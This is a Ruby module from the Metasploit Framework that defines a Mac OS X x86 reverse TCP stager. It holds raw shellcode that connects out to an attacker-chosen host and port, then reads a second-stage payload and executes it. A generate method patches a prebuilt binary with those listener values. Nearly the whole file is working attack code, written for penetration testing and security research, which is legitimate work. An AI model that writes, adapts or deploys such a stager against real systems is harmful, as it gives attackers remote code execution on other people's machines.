##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'

###
#
# ReverseTcp
# -------
#
# Mac OS X x86 Reverse TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Osx

  def initialize(info = { })
    super(merge_info(info,
      'Name'           => 'Reverse TCP Stager',
      'Description'    => 'Connect, read length, read buffer, execute',
      'Author'         => ['ddz', 'anwarelmakrahy'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'osx',
      'Arch'           => ARCH_X86,
      'Handler'        => Msf::Handler::ReverseTcp,
      'Convention'     => 'sockedi',
      'Stager'        =>
      {
        'Offsets' =>
        {
          'LHOST' => [ 20, 'ADDR'],
          'LPORT' => [ 27, 'n']
        },
        'Payload' =>
          "\x31\xc0\x99\x50\x40\x50\x40\x50"+
          "\x52\xb0\x61\xcd\x80\x72\x6c\x89"+
          "\xc7\x52\x52\x68\x7f\x00\x00\x01"+
          "\x68\x00\x02\x34\x12\x89\xe3\x6a"+
          "\x10\x53\x57\x52\xb0\x62\xcd\x80"+
          "\x72\x51\x89\xe5\x83\xec\x08\x31"+
          "\xc9\xf7\xe1\x51\x89\xe6\xb0\x04"+
          "\x50\x56\x57\x50\x48\xcd\x80\x72"+
          "\x3a\x8b\x74\x24\x10\x31\xc0\x50"+
          "\x50\x48\x50\x40\x66\xb8\x02\x10"+
          "\x50\x31\xc0\xb0\x07\x50\x56\x52"+
          "\x52\xb0\xc5\xcd\x80\x72\x1c\x89"+
          "\xc3\x01\xf3\x56\x89\xd8\x29\xf0"+
          "\x50\x57\x52\x31\xc0\xb0\x03\xcd"+
          "\x80\x72\x08\x29\xc3\x29\xc6\x75"+
          "\xea\xff\xe3"
      }
    ))
  end

  def handle_intermediate_stage(conn, p)
    #
    # Our stager payload expects to see a next-stage length first.
    #
    conn.put([p.length].pack('V'))
  end

  def generate(*args)
    bin = ::File.read(::File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
    
    if datastore['LHOST']
      bin = string_sub(bin, 'XXXX127.0.0.1      ', "XXXX" + datastore['LHOST'].to_s)
    end
    
    if datastore['LPORT']
      bin = string_sub(bin, 'YYYY4444           ', "YYYY" + datastore['LPORT'].to_s)
    end

    bin
  end
end
